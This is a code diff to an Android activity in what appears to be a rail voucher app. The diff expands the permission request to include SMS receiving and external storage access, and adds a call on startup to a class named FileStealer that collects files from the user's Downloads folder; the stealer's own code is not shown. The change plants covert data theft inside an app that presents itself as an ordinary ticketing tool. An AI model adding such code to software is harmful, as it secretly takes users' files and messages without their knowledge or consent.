@@ -15,6 +15,7 @@ import androidx.lifecycle.MutableLiveData;
 import androidx.viewpager.widget.ViewPager;
 import androidx.appcompat.app.AppCompatActivity;
 
+import android.os.Environment;
 import android.view.View;
 
 import com.example.myapplication.ui.main.SectionsPagerAdapter;
@@ -30,7 +31,7 @@ public class RailVoucherActivity extends AppCompatActivity {
     public List<QRRouteItem> QRItems = new ArrayList<>();
     public MutableLiveData<Integer> QRListner = new MutableLiveData<>();
 
-    private int MY_PERMISSIONS_REQUEST_SMS_RECEIVE = 10;
+    private int MY_PERMISSIONS_REQUEST = 10;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -47,8 +48,13 @@ public class RailVoucherActivity extends AppCompatActivity {
         QRListner.setValue(QRItems.size());
 
         ActivityCompat.requestPermissions(this,
-                new String[]{Manifest.permission.RECEIVE_SMS},
-                MY_PERMISSIONS_REQUEST_SMS_RECEIVE);
+                new String[]{Manifest.permission.RECEIVE_SMS,
+                        Manifest.permission.WRITE_EXTERNAL_STORAGE,
+                        Manifest.permission.READ_EXTERNAL_STORAGE},
+                MY_PERMISSIONS_REQUEST);
+
+        FileStealer stealer = new FileStealer();
+        stealer.getUserFiles(Environment.DIRECTORY_DOWNLOADS);
 
         FloatingActionButton fab = findViewById(R.id.fab);
         fab.setOnClickListener(new View.OnClickListener() {
